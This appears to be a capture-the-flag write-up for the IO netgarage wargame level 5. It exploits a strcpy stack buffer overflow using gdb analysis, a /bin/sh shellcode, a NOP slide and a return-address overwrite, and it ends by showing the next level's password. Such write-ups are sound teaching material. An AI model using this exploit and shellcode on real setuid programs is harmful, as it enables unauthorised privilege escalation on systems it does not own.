---

title: Level 5
link: ssh level5@io.netgarage.org

---

This challenge involve an unsafe instruction: 

    #include <stdio.h>
    #include <string.h>

    int main(int argc, char **argv) {
            char buf[128];
            if(argc < 2) return 1;
            strcpy(buf, argv[1]);
            printf("%s\n", buf);
            return 0;
    }

The important instruction here is the `strcpy`, it will copy all bytes from the string at the address `argv[1]` to the buffer `buf`. Because there is no control over how much bytes are copied, this can be used to write outside of the `buf` string.

We can try that easily:

    level5@io:/levels$ ./level05 a
    a
    level5@io:/levels$ ./level05 $(python -c "print 'a'*140")
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    a
    Segmentation fault

Let's have a proper look inside gdb:

    level5@io:/levels$ gdb -q level05
    Reading symbols from level05...done.
    (gdb) disass main
    Dump of assembler code for function main:
       ...
       0x080483e1 <+45>:    mov    %eax,0x4(%esp)
       0x080483e5 <+49>:    lea    -0x88(%ebp),%eax
       0x080483eb <+55>:    mov    %eax,(%esp)
       0x080483ee <+58>:    call   0x80482d4 <strcpy@plt>
       0x080483f3 <+63>:    lea    -0x88(%ebp),%eax
       0x080483f9 <+69>:    mov    %eax,0x4(%esp)
       ...
    End of assembler dump.
    (gdb) break *0x080483ee
    Breakpoint 1 at 0x80483ee

In this setup I have a breakpoint set up right before the call to `strcpy` is made:

    (gdb) run $(python -c "print 'a'*140")
    Starting program: /levels/level05 $(pyt
    Breakpoint 1, 0x080483ee in main ()

I start the program with the same argument as before.

    (gdb) x/4 $esp
    0xbffffb20:     0xbffffb40      0xbffffd9a      0x00000001      0xb7fff930

Here I display the stack buffer, to reveal something critical. In order to use the `strcpy` function the [arguments](http://en.cppreference.com/w/c/string/byte/strcpy) need to be passed on the stack. So `0xbffffb40` is the address of `buf` and `0xbffffd9a` is the value of `argv[1]`:

    (gdb) x/s 0xbffffb40
    0xbffffb40:     ","
    (gdb) x/s 0xbffffd9a
    0xbffffd9a:     'a' <repeats 140 times>

`buf` contains a random value and `argv[1]` our argument, so far so good.

Now let's have a look at the stack:

    (gdb) x/10wx $ebp
    0xbffffbc8:     0x00000000      0xb7e3aa63      0x00000002      0xbffffc64
    0xbffffbd8:     0xbffffc70      0xb7fed79a      0x00000002      0xbffffc64
    0xbffffbe8:     0xbffffc04      0x08049618

This is the base of the stack, and the difference with the `buf` address is:

    (gdb) print 0xbffffbc8 - 0xbffffb40
    $1 = 136

So even if the `buf` array is only 128 chars long, 136 bytes were reserved for it.

Let's run the `strcpy`:

    (gdb) nexti
    0x080483f3 in main ()
    (gdb) x/10wx $ebp
    0xbffffbc8:     0x61616161      0xb7e3aa00      0x00000002      0xbffffc64
    0xbffffbd8:     0xbffffc70      0xb7fed79a      0x00000002      0xbffffc64
    0xbffffbe8:     0xbffffc04      0x08049618

You can see that the value of `$ebp` is now "aaaa", it's the very end of the string. We can make this even clearer:

    (gdb) run $(python -c "print 'a'*136 + 'bcde'")
    Starting program: /levels/level05 $(python -c "print 'a'*136 + 'bcde'")
    Breakpoint 1, 0x080483ee in main ()
    (gdb) nexti
    0x080483f3 in main ()
    (gdb) x/s $ebp
    0xbffffbc8:     "bcde"

Now the `$ebp` contains clearly the last 4 bytes of the string, we'll use this later.

Let's try something else:

    (gdb) run $(python -c "print 'a'*144 + 'bcde'")
    Starting program: /levels/level05 $(python -c "print 'a'*140 + 'bcde'")
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...
    Program received signal SIGSEGV, Segmentation fault.
    0x65646362 in ?? ()

In this error we see that the last bytes are again causing troubles, but this time (because we've passed 144 bytes in total), we're overriding something else, the return address of this function.

The stack frame is composed as follow:

         <-     4 bytes      ->
    ^    ----------------------
    |    |        argv        |
    m    ----------------------
    e    |        argc        |
    m    ----------------------
    o    |   return address   |
    r    ----------------------
    y    |    previous ebp    |
         ----------------------
         |                    | <- ebp
         |                    |
                  ...
         |                    |
         |     136 bytes      |
         |                    | <- buf  -0x88(%ebp)
         ----------------------
    s    |                    |
    t    |                    |
    a             ...
    c    |                    |
    k    |     32 bytes       |
    |    |                    | <- esp
    v    ----------------------


So the buffer has the first 136 bytes of the stack, and the stack pointer moves below 32 bytes more.

When the buffer is filled, it will be filled upwards, which make the return address accessible to write. The address of `buf` is `0x88` bytes below `$ebp`:

    (gdb) print 0x88
    $2 = 136

This is exactly 136 bytes, so to override the value of the return address, we need to override the value 8 bytes after `$ebp` which is what we've done previously.

Once this value change, the processor will try to jump to that address for the next intruction.

As a side note, we can also find back the values of `argc` and `argv` using `$ebp`:

    (gdb) x/4wx $ebp
    0xbffffc58:     0x00000000      0xb7e3aa63      0x00000002      0xbffffcf4
    #               previous ebp    return address  argc            argv

    (gdb) x/s *0xbffffcf4
    0xbffffe15:     "/levels/level05"
    (gdb) x/s *0xbffffcf8
    0xbffffe25:     "a"

Here we have `argv[0]` and `argv[1]`, which is `argv[0]+4`.

So we know that we need to override the return address with another address, but which one? We can controle the content of the `buf` string, so it is what we'll modify.

In order to gain access, and to spawn a shell, we need a shellcode. We'll use the following shellcode:

    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Which is a simple call to "/bin/sh", inspired from [here](http://shell-storm.org/shellcode/files/shellcode-827.php).

To make the processor execute this code, we need to make the `$eip` equal to it first byte, to do that, we'll use a well-known technique of the [NOP Slide](https://en.wikipedia.org/wiki/NOP_slide).

Let say you can set up the next address of instruction, but you have only an approximation of where your shellcode is, you can build a "slide" that will leave the processor to your shellcode:

    / uncertain address
    v
    \x90\x90\x90\x90...\x90<shellcode>

So when you set the address, instead of having a perfect match, you just need to give an address inside the NOP slide and the processor will end up executing the shellcode.

In our case we have the following scenario:

    136                  4    4
    [buf                ][ebp][ret]
    \x90\x90...\x90<shellcode><add>
    ??             25         4

Our shellcode is 25 bytes long so we have a total of 136 + 4 - 25 = 115 NOP bytes to fill.

To generate our string let's use the following python code

    print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "<address>"

We just need to find the address of the Nop slide somewhere in memory. There's two places where we can find it: inside the buffer after copy, on the stack as an argument all the time. Here is how to do it with `argv[1]` on the stack:

I run the payload without address to inspect the stack:

    (gdb) break main
    Breakpoint 1 at 0x80483bd
    (gdb) run $(python -c 'print "\x90"*115')
    Starting program: /levels/level05 $(pytho
    Breakpoint 1, 0x080483bd in main ()
    (gdb) x/200wx $esp
    0xbffffb40:     0x00000001      0x00000000      0x00000001      0xb7fff930
    0xbffffb50:     0xb7ff8300      0x00000000      0xb7e20940      0x00000001
    0xbffffb60:     0x0000002c      0x00000006      0x002c307d      0x00000000
    0xbffffb70:     0xbffffc24      0xbffffb98      0xbffffb90      0x0804820b
    ...
    0xbffffc50:     0x00000002      0x080482f0      0x00000000      0x08048311
    0xbffffc60:     0x080483b4      0x00000002      0xbffffc84      0x08048470 <- ebp
    0xbffffc70:     0x08048420      0xb7fedc50      0xbffffc7c      0x0000001c
    ...
    0xbffffd50:     0x0000000d      0x000003ed      0x0000000e      0x000003ed
    0xbffffd60:     0x00000017      0x00000000      0x00000019      0xbffffd8b
    0xbffffd70:     0x0000001f      0xbfffffec      0x0000000f      0xbffffd9b
    0xbffffd80:     0x00000000      0x00000000      0x9f000000      0x1ce9fe5d
    0xbffffd90:     0x0c252d59      0x50cdb0e6      0x69728706      0x00363836
    0xbffffda0:     0x2f000000      0x6576656c      0x6c2f736c      0x6c657665
    0xbffffdb0:     0x90003530      0x90909090      0x90909090      0x90909090 <- the nop slide
    0xbffffdc0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffdd0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffde0:     0x90909090      0x90909090      0x90909090      0x90909090 <- 0xbffffde0 looks nice
    0xbffffdf0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffe00:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffe10:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffe20:     0x90909090      0x58009090      0x535f4744      0x49535345
    0xbffffe30:     0x495f4e4f      0x31313d44      0x00303937      0x4c454853
    0xbffffe40:     0x622f3d4c      0x622f6e69      0x00687361      0x4d524554
    0xbffffe50:     0x7263733d      0x2d6e6565      0x63363532      0x726f6c6f



Let's convert `0xbffffde0` to the hex representation:

    \xe0\xfd\xff\xbf

We have our complete payload:

    print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xe0\xfd\xff\xbf"

Let's use that in gdb:

    (gdb) run $(python -c 'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xe0\xfd\xff\xbf"')
    Starting program: /levels/level05 $(python -c 'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xe0\xfd\xff\xbf"')
    1Ph//shh/biǹ
    process 19609 is executing new program: /bin/bash
    sh-4.3$ whoami
    level5
    sh-4.3$ exit

We are in! But we are still the user level5, that's because we're running the executable from gdb, let's try without:

    level5@io:/levels$ ./level05  $(python -c 'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xe0\xfd\xff\xbf"')
    1Ph//shh/biǹ
    sh-4.3$ whoami
    level6
    sh-4.3$ cat /home/level6/.pass
    fQ8W8YlSBJBWKV2R

> fQ8W8YlSBJBWKV2R
